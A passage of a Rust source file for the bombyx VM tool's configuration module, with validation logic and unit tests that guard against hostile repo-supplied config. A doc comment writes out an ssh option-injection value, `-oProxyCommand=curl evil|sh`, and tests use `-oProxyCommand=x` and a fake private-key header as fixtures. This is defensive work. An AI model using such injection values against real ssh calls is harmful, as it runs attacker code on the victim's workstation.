//! Project configuration (`bombyx.toml`).
//!
//! A bombyx project describes its VM in `bombyx.toml`, in the
//! project repo. The VM host holds nothing from that repo:
//! bombyx renders the Vagrantfile from `[vm]` and writes it
//! there on every `up`. This module reads that per-project
//! configuration.
//!
//! **The VM host is not part of it.** Which machine runs the
//! VMs is a property of the developer, not of the project --
//! each person has their own hardware on their own network --
//! so `host` comes from a per-developer file, the environment
//! or `--host`, and is refused in `bombyx.toml`. See
//! [`HostSources`] for the order they are consulted in.
//!
//! Because `bombyx.toml` ships *inside a repo*, it is
//! attacker-controlled data the moment you clone or check out
//! someone else's branch. So every field is checked against an
//! explicit allowlist rather than trusted.
//!
//! Two of them are checked by their *type* and cannot be built
//! wrong at all: see [`RepoUrl`]. The rest are checked by
//! `Config::validate`, which the loading path runs. `Config`
//! has public fields, so a hand-built one skips that check.
//! That is a gap rather than a decision, argued once in
//! `docs/architecture.md` under "What config values are
//! checked". (`validate` is named rather than linked because
//! it is private, and rustdoc rejects a public page pointing
//! at a private item.)
//!
//! # Where each rule lives
//!
//! This module owns [`Config`] itself. Everything else is a
//! private child module, so rustdoc will not list them:
//!
//! - `read` -- getting a config file off disk: whether the path
//!   may be a symlink, how large a file may be, and how a TOML
//!   error is summarised.
//! - `error` -- the two error types, and why there are two.
//! - `guards` -- the rules more than one field shares.
//! - `host` -- where the VM host name comes from, and its shape.
//! - `root` -- every rule `remote_root` must pass.
//! - `source` -- the `[source]` table and its two checked types.
//! - `vm` -- the `[vm]` table.
//!
//! A new field rule belongs in the module that owns the field.
//! Put it in `guards` only once a second field needs it.

use std::path::Path;

use serde::Deserialize;

use crate::name::{ScratchName, check_segment};

mod error;
mod guards;
mod host;
mod read;
mod root;
mod source;
mod vm;

/// The `[vm]` and `[source]` tables every project file needs.
///
/// Every test that needs them reads this one constant. Writing
/// the eleven lines out per test module would mean editing each
/// module to add a required field, and a module somebody missed
/// would fail in a test about something else entirely.
#[cfg(test)]
const REQUIRED_TABLES: &str = "\n[vm]\n\
     provider = \"libvirt\"\n\
     box = \"generic/ubuntu2204\"\n\
     cpus = 2\n\
     memory = 2048\n\
     \n\
     [source]\n\
     repo = \"https://example.invalid/myproject.git\"\n\
     ref = \"main\"\n\
     script = \"vagrant/provision.sh\"\n";

pub use error::{ConfigError, FieldError};
pub use host::{
    CONFIG_DIR_ENV, HOST_ENV, HostOrigin, HostSources, USER_CONFIG_FILE,
    user_config_dir,
};
pub(crate) use host::{
    HostProblem, host_places, host_problem, is_anchored_dir, resolve_host,
};
pub use source::{RepoUrl, ScriptPath, Source};
pub use vm::{Provider, Vm};

use read::{
    MAX_CONFIG_BYTES, Symlinks, from_toml, path_display, read_optional,
};
pub(crate) use root::path_segments;

/// Default root on the VM host under which project
/// directories are created.
const DEFAULT_REMOTE_ROOT: &str = "~/vms";

/// A resolved bombyx configuration.
///
/// The project fields come from `bombyx.toml`; `host` does not
/// (see [`HostSources`]).
#[derive(Debug, Clone, PartialEq, Eq)]
pub struct Config {
    /// SSH host alias of the VM host, e.g. `vmhost`.
    ///
    /// Resolved through the user's `~/.ssh/config`, so
    /// bombyx never deals with addresses or usernames.
    ///
    /// **Never read from `bombyx.toml`.** The VM host is a
    /// property of the person driving bombyx, not of the
    /// project: everyone on a team has their own machine on
    /// their own network, and a committed file can name only
    /// one of them -- pointing everyone else's `destroy` at a
    /// colleague's host.
    pub host: String,

    /// Project name. Doubles as the directory name on the
    /// VM host.
    pub project: String,

    /// Root directory on the VM host under which project
    /// directories are created.
    pub remote_root: String,

    /// The machine to build. Rendered into the Vagrantfile
    /// bombyx writes on the VM host.
    pub vm: Vm,

    /// Where the guest clones the project from.
    pub source: Source,
}

/// The committed project file, exactly as it parses.
///
/// Separate from [`Config`] because the two differ: this is
/// what `bombyx.toml` may contain, and `Config` is what bombyx
/// runs with after a host has been found elsewhere.
///
/// `host` appears here only so it can be *rejected* by name.
/// Leaving it out would make `deny_unknown_fields` report
/// "unknown field `host`", which reads as a typo rather than as
/// a field that deliberately moved.
#[derive(Debug, Deserialize)]
#[serde(deny_unknown_fields)]
struct ProjectFile {
    host: Option<String>,

    project: String,

    #[serde(default = "default_remote_root")]
    remote_root: String,

    vm: Vm,

    source: Source,
}

fn default_remote_root() -> String {
    DEFAULT_REMOTE_ROOT.to_owned()
}

impl ProjectFile {
    /// Assembles a [`Config`], with `host` supplied separately.
    ///
    /// `host` comes from elsewhere because `bombyx.toml` is
    /// forbidden to carry one: that file travels inside a
    /// repository bombyx does not trust, and the value reaches
    /// `ssh` as a bare argument. [`Config::load`] ranks it
    /// across three sources; the test-only `Config::parse` takes
    /// it from its caller.
    fn into_config(self, host: String) -> Config {
        Config {
            host,
            project: self.project,
            remote_root: self.remote_root,
            vm: self.vm,
            source: self.source,
        }
    }
}

/// Refuses a project file carrying a `host` key.
///
/// Ignoring it with a warning was the alternative, and it is
/// worse: the key stays committed in the repo, the warning gets
/// tuned out, and the next reader cannot tell whether the value
/// is in force. An error is read once and fixed once.
fn reject_host_key(
    file: &ProjectFile,
    path: &Path,
    sources: &HostSources,
) -> Result<(), ConfigError> {
    if file.host.is_none() {
        return Ok(());
    }
    Err(ConfigError::HostInProjectFile {
        path: path.to_path_buf(),
        places: host_places(sources),
    })
}

impl Config {
    /// Parses a project file, with `host` supplied separately.
    ///
    /// `path` is used only for error messages.
    ///
    /// **Test-only.** It was `pub` and had no production caller:
    /// everything real goes through [`Config::load`], and the only
    /// users were `for_tests` and two integration tests, which now
    /// build a temp fixture and call `load` -- exercising the
    /// production path instead of a shortcut past it. That also
    /// removes the reason its message was worse than `load`'s: it
    /// passes `HostSources::default()`, so a refused `host` key
    /// could not name the per-developer file.
    ///
    /// The remaining hazard is that `source` and `host` are adjacent
    /// `&str`, so `parse(host, path, source)` compiles. A `Host`
    /// newtype would stop that and is not worth its construction
    /// sites for a `#[cfg(test)]` constructor whose callers are all
    /// in this crate's own test suite.
    ///
    /// # Errors
    ///
    /// Returns [`ConfigError::Parse`] if the source is not
    /// valid TOML or carries an unknown key,
    /// [`ConfigError::HostInProjectFile`] if it carries a
    /// `host` key, and [`ConfigError::Empty`] /
    /// [`ConfigError::Invalid`] if a field fails validation.
    #[cfg(test)]
    pub(crate) fn parse(
        source: &str,
        path: &Path,
        host: &str,
    ) -> Result<Self, ConfigError> {
        let file: ProjectFile = from_toml(source, path)?;
        reject_host_key(&file, path, &HostSources::default())?;
        let cfg = file.into_config(host.to_owned());
        cfg.validate()?;
        Ok(cfg)
    }

    /// The config every module's tests use.
    ///
    /// It lives next to the type it builds, so every test module
    /// shares one copy. Written out per module, adding a required
    /// field would mean the same edit in each of them, and the
    /// two literals would be pinned in as many places.
    #[cfg(test)]
    #[must_use]
    pub(crate) fn for_tests() -> Self {
        Self::parse(
            &format!("project = \"myproject\"\n{REQUIRED_TABLES}"),
            Path::new("bombyx.toml"),
            "vmhost",
        )
        .expect("the shared test config must be valid")
    }

    /// Loads a configuration: the project file, and a VM host
    /// ranked across `sources` and the per-developer file.
    ///
    /// **This reads up to two paths.** After `path`, and only
    /// when neither `sources.flag` nor `sources.env` names a
    /// host, the per-developer file in `sources.user_config_dir`
    /// is read for one. That file existing but failing to read
    /// or parse is an error rather than a silent fallback.
    ///
    /// Reading it last is what makes `--host` work on a machine
    /// whose per-developer file is missing or broken.
    ///
    /// Every setting other than the host comes from `path`
    /// alone. Validation therefore runs on the project file's
    /// own values, with the winning host already in place so it
    /// is checked too.
    ///
    /// Returns the winning [`HostOrigin`] alongside the config,
    /// so a caller reporting which host is in force does not
    /// re-derive the precedence rule.
    ///
    /// # Errors
    ///
    /// Returns [`ConfigError::NotFound`] if `path` is absent,
    /// [`ConfigError::Read`] if a file cannot be read,
    /// [`ConfigError::NotAFile`] or [`ConfigError::TooLarge`]
    /// if one is not a plain file of sensible size,
    /// [`ConfigError::Parse`] if one is not valid TOML,
    /// [`ConfigError::HostInProjectFile`] if the project file
    /// carries a `host` key, [`ConfigError::HostMissing`] if no
    /// source names a host, and [`ConfigError::Empty`] /
    /// [`ConfigError::Invalid`] if a field fails validation.
    /// The path carried by an error may be an optional file's
    /// rather than `path`.
    pub fn load(
        path: &Path,
        sources: &HostSources,
    ) -> Result<(Self, HostOrigin), ConfigError> {
        // Absence is the one io error that means something
        // different for the two files, so it is mapped here
        // rather than inside the shared reader.
        let source = read_optional(path, Symlinks::Refuse)?
            .ok_or_else(|| ConfigError::NotFound(path.to_path_buf()))?;

        let file: ProjectFile = from_toml(&source, path)?;
        reject_host_key(&file, path, sources)?;

        let (host, origin) = resolve_host(sources)?;

        // Checked here, while the winning source is still known,
        // so the message identifies the file (or flag) actually
        // carrying the bad value rather than the project file.
        if let Some(problem) = host_problem(&host) {
            return Err(ConfigError::InvalidHost {
                origin: match origin {
                    HostOrigin::UserFile => sources
                        .user_config_dir
                        .map(|d| d.join(USER_CONFIG_FILE))
                        .map_or_else(
                            || origin.to_string(),
                            |p| path_display(&p),
                        ),
                    HostOrigin::Flag | HostOrigin::Env => origin.to_string(),
                },
                reason: match problem {
                    HostProblem::Empty => "must not be empty".to_owned(),
                    HostProblem::Invalid(reason) => reason,
                },
            });
        }

        let cfg = file.into_config(host);
        cfg.validate()?;
        Ok((cfg, origin))
    }

    /// Rejects values that are empty or outside their allowed
    /// shape.
    ///
    /// The `host` rules matter most. `host` is passed as the
    /// first positional argument to `ssh`, which does not
    /// honour a `--` end-of-options separator. A value starting
    /// with `-` is therefore read
    /// as an *option*, so `-oProxyCommand=curl evil|sh` runs
    /// code on this workstation from a bare `bombyx status`,
    /// before any network traffic.
    ///
    /// A cloned repo cannot supply that value, because `host` is
    /// refused in `bombyx.toml` (see
    /// [`ConfigError::HostInProjectFile`]). The check covers the
    /// two sources that can: a per-developer `config.toml`, and
    /// `--host` / [`HOST_ENV`]. A mistake or a careless script
    /// fills either of those in. The other fields *are*
    /// repo-supplied, so their rules carry the full weight.
    fn validate(&self) -> Result<(), ConfigError> {
        // The host rule lives in `host_problem`, so this and the
        // source-naming check in `load` cannot disagree.
        match host_problem(&self.host) {
            Some(HostProblem::Empty) => {
                return Err(ConfigError::Empty { field: "host" });
            }
            Some(HostProblem::Invalid(reason)) => {
                return Err(ConfigError::Invalid {
                    field: "host",
                    reason,
                });
            }
            None => {}
        }

        // Each field specifies the program it will reach.
        //
        // `project` is checked here; `remote_root` gets the same
        // two rules inside `root::check` below, along with its
        // own four.
        //
        // **For both the rule is a precaution, not a live hole.**
        // Only `host` is handed to a program as a bare argument
        // that a leading `-` could turn into an option. `project`
        // and `remote_root` go through `quote_remote_path` into a
        // shell script that `ssh` runs, so they arrive quoted.
        // The rule is kept anyway, because each of those
        // protections lives in a different file from the value,
        // and either could be rewritten by somebody who does not
        // know it is what makes the value safe.
        guards::check_not_empty("project", &self.project)?;
        guards::check_not_an_option("project", &self.project, "ssh")?;
        guards::check_not_empty("remote_root", &self.remote_root)?;

        // `project` becomes one directory name on the host.
        check_segment(&self.project).map_err(|e| ConfigError::Invalid {
            field: "project",
            reason: e.to_string(),
        })?;

        // Every `remote_root` rule lives in `config::root`,
        // because bombyx deletes the directory it derives from
        // that value. See the module for what each rule stops.
        root::check(&self.remote_root)?;

        self.validate_generated()
    }

    /// Runs the `[vm]` and `[source]` checks that types cannot.
    ///
    /// Each table's rules live in the module that owns it, and
    /// this is the only place either is called from, so no
    /// caller can run one half of the checks without the other.
    ///
    /// Split out of [`Config::validate`] because that function
    /// outgrew the 100-line limit.
    fn validate_generated(&self) -> Result<(), ConfigError> {
        // The `?` widens each `FieldError` into a `ConfigError`.
        // See the `From` impl in `config::error`.
        vm::validate(&self.vm)?;
        source::validate(&self.source)?;
        Ok(())
    }

    /// Returns the project directory on the VM host, e.g.
    /// `~/vms/myproject`.
    ///
    /// A trailing slash on `remote_root` is ignored so the
    /// result never contains a doubled separator.
    #[must_use]
    pub fn remote_project_dir(&self) -> String {
        format!("{}/{}", self.root(), self.project)
    }

    /// Returns the directory on the VM host used for an
    /// ephemeral (`scratch`) VM of this project.
    ///
    /// The project name is part of the path: `scratch pr-1`
    /// in two different projects must not resolve to the same
    /// directory, or the second boot extracts one project's
    /// Vagrantfile over the other's live `.vagrant/`.
    #[must_use]
    pub fn remote_scratch_dir(&self, name: &ScratchName) -> String {
        format!("{}/scratch/{}/{name}", self.root(), self.project)
    }

    /// Returns `remote_root` without any trailing slash.
    fn root(&self) -> &str {
        self.remote_root.trim_end_matches('/')
    }
}

#[cfg(test)]
mod tests {
    use std::path::PathBuf;

    use super::host::config_dir_from;
    use super::*;

    #[test]
    fn a_parse_error_names_the_position_and_not_the_line() {
        // The disclosure this replaced: `toml`'s own `Display`
        // quotes the offending source line, and bombyx printed it
        // to stderr. `bombyx.toml` can be a symlink, so a hostile
        // repo aimed it at a private key and had a line echoed.
        // Measured against the built binary before and after.
        let key = "-----BEGIN OPENSSH PRIVATE KEY-----\n\
                   b3BlbnNzaC1rZXktdjEAAAAA\n";
        let err = parse(key).unwrap_err();
        let text = err.to_string();
        assert!(matches!(err, ConfigError::Parse { .. }), "{text}");
        // The position and the reason are what correct a malformed
        // config, and they stay.
        assert!(text.contains("line 1"), "{text}");
        assert!(text.contains("column"), "{text}");
        // None of the file's own bytes do.
        assert!(!text.contains("BEGIN"), "{text}");
        assert!(!text.contains("OPENSSH"), "{text}");
        assert!(!text.contains("b3Blb"), "{text}");
    }

    #[test]
    fn a_shape_error_still_names_the_field() {
        // An unknown key carries no span, so the summary is the
        // reason alone -- which names the key, and that is the
        // whole answer.
        let err = parse("project = \"p\"\nhsot = \"x\"\n").unwrap_err();
        let text = err.to_string();
        assert!(text.contains("hsot"), "{text}");
    }
    /// The smallest project file that validates.
    ///
    /// Not one line: `[vm]` and `[source]` are required, so the
    /// smallest valid file carries both tables.
    ///
    /// The tables come last, and every caller passes this whole
    /// rather than appending to it. A bare key appended after a
    /// table header joins that table instead of the top level,
    /// and still parses -- so a test meaning to set
    /// `remote_root` would silently set `vm.remote_root` and
    /// fail on `deny_unknown_fields` somewhere unrelated.
    fn minimal() -> String {
        format!("project = \"myproject\"\n{REQUIRED_TABLES}")
    }

    /// The required tables, for a test composing its own
    /// top-level keys. Append this *after* those keys.
    fn required_tables() -> &'static str {
        "\n[vm]\n\
         provider = \"libvirt\"\n\
         box = \"generic/ubuntu2204\"\n\
         cpus = 2\n\
         memory = 2048\n\
         \n\
         [source]\n\
         repo = \"https://example.invalid/myproject.git\"\n\
         ref = \"main\"\n\
         script = \"vagrant/provision.sh\"\n"
    }

    /// Appends the required tables when `source` lacks them.
    ///
    /// Nearly every test here varies one top-level key and
    /// cares nothing about the machine description. Making each
    /// spell out `[vm]` and `[source]` would bury the line under
    /// test in ten lines of scenery.
    ///
    /// A test *about* a missing section must not be repaired by
    /// this, so those call [`Config::parse`] directly rather
    /// than going through the helpers below.
    fn completed(source: &str) -> String {
        // Any table header, not just `[vm]`. Sniffing for `[vm]`
        // alone meant a fixture declaring only `[source]` -- the
        // exact case a missing-`[vm]` test needs -- had a second
        // `[source]` appended and failed on a duplicate key
        // instead of on the missing table.
        if source.lines().any(|l| l.trim_start().starts_with('[')) {
            source.to_owned()
        } else {
            format!("{source}{}", required_tables())
        }
    }

    fn parse(source: &str) -> Result<Config, ConfigError> {
        Config::parse(&completed(source), Path::new("bombyx.toml"), "vmhost")
    }

    /// Parses the minimal project file with an explicit host.
    ///
    /// The host does not come from the file being parsed, so a
    /// test about host values varies this argument rather than
    /// the TOML.
    fn parse_with_host(host: &str) -> Result<Config, ConfigError> {
        Config::parse(&minimal(), Path::new("bombyx.toml"), host)
    }

    fn good() -> Config {
        parse(&minimal()).unwrap()
    }

    fn scratch(name: &str) -> ScratchName {
        ScratchName::parse(name).unwrap()
    }

    #[test]
    fn parses_minimal_config_and_applies_defaults() {
        let cfg = good();
        assert_eq!(cfg.host, "vmhost");
        assert_eq!(cfg.project, "myproject");
        assert_eq!(cfg.remote_root, "~/vms");
    }

    #[test]
    fn parses_explicit_overrides() {
        let src = "project = \"ledgerstone\"\n\
                   remote_root = \"/srv/vms\"\n";
        let cfg = parse(src).unwrap();
        assert_eq!(cfg.remote_root, "/srv/vms");
    }

    /// [`Config::load`] without the origin.
    ///
    /// Most tests are about the resulting config; the ones about
    /// provenance call `Config::load` directly and assert on the
    /// [`HostOrigin`] it returns.
    fn load(path: &Path, sources: &HostSources) -> Result<Config, ConfigError> {
        Config::load(path, sources).map(|(cfg, _origin)| cfg)
    }

    /// Writes a per-developer config naming `host`.
    fn write_user_file(dir: &Path, host: &str) {
        std::fs::write(
            dir.join(USER_CONFIG_FILE),
            format!("host = {host:?}\n"),
        )
        .unwrap();
    }

    /// Sources whose only entry is the per-developer directory.
    fn user_sources(dir: &Path) -> HostSources<'_> {
        HostSources {
            user_config_dir: Some(dir),
            ..HostSources::default()
        }
    }

    /// Sources naming a host on the command line.
    fn flag_sources(host: &str) -> HostSources<'_> {
        HostSources {
            flag: Some(host),
            ..HostSources::default()
        }
    }

    /// Writes the minimal project file into a fresh directory.
    fn project_dir(source: &str) -> (tempfile::TempDir, PathBuf) {
        let dir = tempfile::tempdir().unwrap();
        let base = dir.path().join("bombyx.toml");
        std::fs::write(&base, completed(source)).unwrap();
        (dir, base)
    }

    #[test]
    fn rejects_a_host_key_in_the_project_file() {
        // The design rule, asserted: the VM host belongs to the
        // developer, and this file is committed. Refused rather
        // than ignored, so a stale key cannot sit in a repo
        // aiming everyone's `destroy` at one person's machine.
        let (dir, base) = project_dir("host = \"vmhost\"\nproject = \"p\"\n");
        let err = load(&base, &user_sources(dir.path())).unwrap_err();
        assert!(matches!(err, ConfigError::HostInProjectFile { .. }));
        let text = err.to_string();
        // The message has to say where the line goes instead,
        // or it only reports a problem.
        assert!(text.contains(USER_CONFIG_FILE), "{text}");
        assert!(text.contains("committed"), "{text}");
    }

    #[test]
    fn a_host_key_is_refused_even_when_a_flag_supplies_one() {
        // Tempting to let the flag win and move on. It must not:
        // the committed key is the thing being removed, and a
        // run that succeeds is a run nobody fixes.
        let (_dir, base) = project_dir("host = \"vmhost\"\nproject = \"p\"\n");
        assert!(matches!(
            load(&base, &flag_sources("mine")).unwrap_err(),
            ConfigError::HostInProjectFile { .. }
        ));
    }

    #[test]
    fn reports_no_host_configured_when_nothing_supplies_one() {
        let (dir, base) = project_dir(&minimal());
        let err = load(&base, &user_sources(dir.path())).unwrap_err();
        assert!(matches!(err, ConfigError::HostMissing { .. }));
        // Every way out is named, since the operator has to pick
        // one and the file is not discoverable by guessing.
        let text = err.to_string();
        assert!(text.contains(USER_CONFIG_FILE), "{text}");
        assert!(text.contains("--host"), "{text}");
        assert!(text.contains(HOST_ENV), "{text}");
    }

    #[test]
    fn takes_the_host_from_the_user_config_file() {
        let (dir, base) = project_dir(&minimal());
        write_user_file(dir.path(), "my-vmhost");
        let sources = user_sources(dir.path());
        assert_eq!(load(&base, &sources).unwrap().host, "my-vmhost");
    }

    #[test]
    fn host_precedence_runs_flag_env_user_file() {
        // All three sources present at once, then removed one at
        // a time. Testing each in isolation would pass with any
        // ordering at all.
        let (dir, base) = project_dir(&minimal());
        write_user_file(dir.path(), "from-user-file");

        let all = HostSources {
            flag: Some("from-flag"),
            env: Some("from-env"),
            ..user_sources(dir.path())
        };
        assert_eq!(load(&base, &all).unwrap().host, "from-flag");

        let no_flag = HostSources { flag: None, ..all };
        assert_eq!(load(&base, &no_flag).unwrap().host, "from-env");

        let no_env = HostSources {
            env: None,
            ..no_flag
        };
        assert_eq!(load(&base, &no_env).unwrap().host, "from-user-file");
    }

    #[test]
    fn load_reports_which_source_won() {
        // The origin is what lets a caller *say* which host is in
        // force without re-deriving the ranking. Asserted for
        // every source, since a constant would satisfy any one of
        // them.
        let (dir, base) = project_dir(&minimal());
        write_user_file(dir.path(), "from-user-file");

        let origin_of =
            |sources: &HostSources| Config::load(&base, sources).unwrap().1;

        let user = user_sources(dir.path());
        assert_eq!(origin_of(&user), HostOrigin::UserFile);

        let env = HostSources {
            env: Some("from-env"),
            ..user
        };
        assert_eq!(origin_of(&env), HostOrigin::Env);

        let flag = HostSources {
            flag: Some("from-flag"),
            ..env
        };
        assert_eq!(origin_of(&flag), HostOrigin::Flag);
    }

    #[test]
    fn an_invalid_host_names_the_source_that_supplied_it() {
        // A bad host must be reported against the source that
        // supplied it. The project file is forbidden to carry a
        // host at all, so naming it in the message sends the
        // operator to edit the one file that cannot be at fault.
        let (dir, base) = project_dir(&minimal());
        write_user_file(dir.path(), "-oProxyCommand=x");
        let err = load(&base, &user_sources(dir.path())).unwrap_err();
        let text = err.to_string();
        assert!(matches!(err, ConfigError::InvalidHost { .. }), "{text}");
        assert!(text.contains(USER_CONFIG_FILE), "{text}");
        assert!(!text.contains("bombyx.toml"), "{text}");

        // And the flag names itself rather than a file.
        let err = load(&base, &flag_sources("-oProxyCommand=x")).unwrap_err();
        assert!(err.to_string().contains("--host"), "{err}");
    }

    #[test]
    fn a_symlinked_user_config_is_followed() {
        // The symlink refusal exists because a *repo* can commit
        // one beside the project file. Nothing in a clone can
        // touch the operator's own config directory, and every
        // ordinary dotfile manager (stow, chezmoi, a hand-made
        // `ln -s`) symlinks exactly this file -- which made bombyx
        // fail on every subcommand with a message that never
        // mentioned symlinks.
        let (dir, base) = project_dir(&minimal());
        let real = dir.path().join("real-config.toml");
        std::fs::write(&real, "host = \"linked-host\"\n").unwrap();

        let link = dir.path().join(USER_CONFIG_FILE);
        if !symlink_file(&real, &link) {
            // Windows needs a privilege for this; the guarantee is
            // asserted wherever the test can create a link.
            return;
        }

        assert_eq!(
            load(&base, &user_sources(dir.path())).unwrap().host,
            "linked-host"
        );
    }

    #[test]
    fn a_symlinked_project_config_is_still_refused() {
        // The other half of the same rule, and the reason it
        // exists: pointed at a private key, the TOML parse error
        // would echo a line of it to stderr.
        let dir = tempfile::tempdir().unwrap();
        let real = dir.path().join("real.toml");
        std::fs::write(&real, minimal()).unwrap();
        let link = dir.path().join("bombyx.toml");
        if !symlink_file(&real, &link) {
            return;
        }
        assert!(matches!(
            load(&link, &flag_sources("vmhost")).unwrap_err(),
            ConfigError::NotAFile(_)
        ));
    }

    /// Creates a file symlink, or `false` where not permitted.
    fn symlink_file(target: &Path, link: &Path) -> bool {
        #[cfg(windows)]
        let result = std::os::windows::fs::symlink_file(target, link);
        #[cfg(not(windows))]
        let result = std::os::unix::fs::symlink(target, link);
        result.is_ok()
    }

    #[test]
    fn an_empty_host_env_var_counts_as_unset() {
        // An exported-but-empty variable is how a shell says "no
        // value". Taking it literally would report an empty-field
        // error naming a file the operator never edited.
        let (dir, base) = project_dir(&minimal());
        write_user_file(dir.path(), "my-vmhost");
        let sources = HostSources {
            env: Some("  "),
            ..user_sources(dir.path())
        };
        assert_eq!(load(&base, &sources).unwrap().host, "my-vmhost");
    }

    #[test]
    fn a_broken_user_config_is_not_read_when_a_flag_wins() {
        // `--host` has to work on a machine whose per-developer
        // file is missing, unreadable or malformed -- that is
        // half the point of having a flag.
        let (dir, base) = project_dir(&minimal());
        std::fs::write(dir.path().join(USER_CONFIG_FILE), "host = ").unwrap();
        let sources = HostSources {
            flag: Some("mine"),
            user_config_dir: Some(dir.path()),
            env: None,
        };
        assert_eq!(load(&base, &sources).unwrap().host, "mine");
    }

    #[test]
    fn a_user_config_rejects_an_unknown_key() {
        // A typo in a file nobody reads twice must be an error,
        // not a setting that silently does nothing.
        let (dir, base) = project_dir(&minimal());
        std::fs::write(dir.path().join(USER_CONFIG_FILE), "hsot = \"x\"\n")
            .unwrap();
        let sources = HostSources {
            user_config_dir: Some(dir.path()),
            ..HostSources::default()
        };
        let err = load(&base, &sources).unwrap_err();
        assert!(matches!(err, ConfigError::Parse { .. }));
        assert!(err.to_string().contains(USER_CONFIG_FILE));
    }

    #[test]
    fn a_user_config_without_a_host_is_not_a_host() {
        // The file exists and parses but names nothing, which
        // must read the same as no file at all.
        let (dir, base) = project_dir(&minimal());
        std::fs::write(dir.path().join(USER_CONFIG_FILE), "\n").unwrap();
        let sources = HostSources {
            user_config_dir: Some(dir.path()),
            ..HostSources::default()
        };
        assert!(matches!(
            load(&base, &sources).unwrap_err(),
            ConfigError::HostMissing { .. }
        ));
    }

    #[test]
    fn a_host_from_the_environment_is_still_validated() {
        // The charset check protects the argv, not the repo: every
        // source that can still supply a host reaches `ssh` as
        // its first argument, and a mistake fills any of them
        // in. The file sources are covered by
        // `an_invalid_host_names_the_source_that_supplied_it`;
        // this is the environment, which no file check reaches.
        let (dir, base) = project_dir(&minimal());
        let sources = HostSources {
            env: Some("-oProxyCommand=x"),
            ..user_sources(dir.path())
        };
        let err = load(&base, &sources).unwrap_err();
        assert!(matches!(err, ConfigError::InvalidHost { .. }), "{err}");
        assert!(err.to_string().contains(HOST_ENV), "{err}");
    }

    /// [`config_dir_from`] against a fixed environment.
    fn config_dir(vars: &[(&str, &str)], windows: bool) -> Option<PathBuf> {
        let owned: Vec<(String, String)> = vars
            .iter()
            .map(|(k, v)| ((*k).to_owned(), (*v).to_owned()))
            .collect();
        config_dir_from(
            move |key| {
                owned.iter().find(|(k, _)| k == key).map(|(_, v)| v.clone())
            },
            windows,
        )
    }

    #[test]
    fn user_config_dir_prefers_its_env_var_then_the_platform_ones() {
        // The override first, then the platform's own variable.
        assert_eq!(
            config_dir(
                &[
                    (CONFIG_DIR_ENV, "/over"),
                    ("APPDATA", "/app"),
                    ("HOME", "/home/i"),
                ],
                true
            ),
            Some(PathBuf::from("/over"))
        );
        assert_eq!(
            config_dir(
                &[("XDG_CONFIG_HOME", "/xdg"), ("HOME", "/home/i")],
                false
            ),
            Some(Path::new("/xdg").join("bombyx"))
        );
        assert_eq!(
            config_dir(&[("HOME", "/home/i")], false),
            Some(Path::new("/home/i").join(".config").join("bombyx"))
        );
        // Nothing usable in the environment: bombyx cannot guess,
        // and a relative guess would read a host out of the repo.
        assert_eq!(config_dir(&[], false), None);
        assert_eq!(config_dir(&[("APPDATA", "/app")], false), None);
    }

    #[test]
    fn appdata_is_consulted_only_on_windows() {
        // Documented as the Windows location, and it was checked
        // on every platform. `APPDATA` is routinely exported in
        // processes that are not Windows -- under WSL via
        // `WSLENV`, under Wine, in some CI images -- where it beat
        // `$HOME/.config` and made bombyx read a host out of a
        // file the docs said applied only to Windows.
        let vars = [("APPDATA", "/app"), ("HOME", "/home/i")];
        assert_eq!(
            config_dir(&vars, true),
            Some(Path::new("/app").join("bombyx"))
        );
        assert_eq!(
            config_dir(&vars, false),
            Some(Path::new("/home/i").join(".config").join("bombyx"))
        );
        // On Windows the home fallback is *not* used: a machine
        // with no APPDATA is one bombyx should not guess about.
        assert_eq!(config_dir(&[("HOME", "/home/i")], true), None);
    }

    #[test]
    fn a_config_dir_that_is_not_anchored_counts_as_unset() {
        // The whole family, not just the blank case that prompted
        // the guard. Each of these resolves against the working
        // directory -- which for this tool means taking the VM
        // host out of whatever repo bombyx was run in, the one
        // thing this design removes. `..` walks out of the tree,
        // and `C:cfg` is drive-*relative*: it resolves against
        // that drive's current directory.
        for bad in [
            "", "  ", ".", "..", "cfg", "cfg/", "./cfg", "C:cfg", "~/cfg",
        ] {
            assert_eq!(
                config_dir(&[(CONFIG_DIR_ENV, bad), ("HOME", "/h")], false),
                Some(Path::new("/h").join(".config").join("bombyx")),
                "{bad:?} must be ignored"
            );
        }
        // And the anchored spellings that must still work.
        for good in ["/srv/cfg", "\\\\srv\\cfg", "C:/cfg", "d:\\cfg"] {
            assert_eq!(
                config_dir(&[(CONFIG_DIR_ENV, good)], false),
                Some(PathBuf::from(good)),
                "{good:?} must be accepted"
            );
        }
    }

    #[test]
    fn an_oversized_config_is_refused() {
        let dir = tempfile::tempdir().unwrap();
        let base = dir.path().join("bombyx.toml");
        // `usize::try_from` rather than `as`: the cap is a
        // `u64`, and a bare cast is a truncation waiting for a
        // 32-bit target.
        let over = usize::try_from(MAX_CONFIG_BYTES).unwrap() + 1;
        std::fs::write(&base, "#".repeat(over)).unwrap();

        assert!(matches!(
            load(&base, &flag_sources("vmhost")).unwrap_err(),
            ConfigError::TooLarge(_)
        ));
    }

    #[test]
    fn accepts_a_user_at_host_destination() {
        let host = "igor@vmhost.local";
        assert_eq!(parse_with_host(host).unwrap().host, host);
    }

    #[test]
    fn rejects_invalid_toml() {
        let err = parse("project = ").unwrap_err();
        assert!(matches!(err, ConfigError::Parse { .. }));
        assert!(err.to_string().contains("bombyx.toml"));
    }

    #[test]
    fn rejects_missing_required_field() {
        let err = parse("remote_root = \"/srv/v\"\n").unwrap_err();
        assert!(matches!(err, ConfigError::Parse { .. }));
    }

    /// Every `[vm]` and `[source]` field, with the line that
    /// states it.
    ///
    /// The requiredness tests below omit one entry at a time
    /// and write the rest, so both tables come from here rather
    /// than from a literal in each test. A literal sibling
    /// table is the hazard: adding a required `[source]` field
    /// later would make the `[vm]` test fail on the new field
    /// while its message blamed whichever `[vm]` field it had
    /// omitted.
    const TABLE_FIELDS: [(&str, &str, &str); 7] = [
        ("vm", "provider", "provider = \"libvirt\""),
        ("vm", "box", "box = \"generic/ubuntu2204\""),
        ("vm", "cpus", "cpus = 2"),
        ("vm", "memory", "memory = 2048"),
        ("source", "repo", "repo = \"https://example.invalid/p.git\""),
        ("source", "ref", "ref = \"main\""),
        ("source", "script", "script = \"vagrant/provision.sh\""),
    ];

    /// A project file stating every required field except
    /// `omitted`, which names one entry of [`TABLE_FIELDS`].
    fn config_without(omitted: &str) -> String {
        let mut src = String::from("project = \"myproject\"\n");
        for table in ["vm", "source"] {
            use std::fmt::Write as _;
            let _ = writeln!(src, "\n[{table}]");
            for (owner, field, line) in TABLE_FIELDS {
                if owner == table && field != omitted {
                    src.push_str(line);
                    src.push('\n');
                }
            }
        }
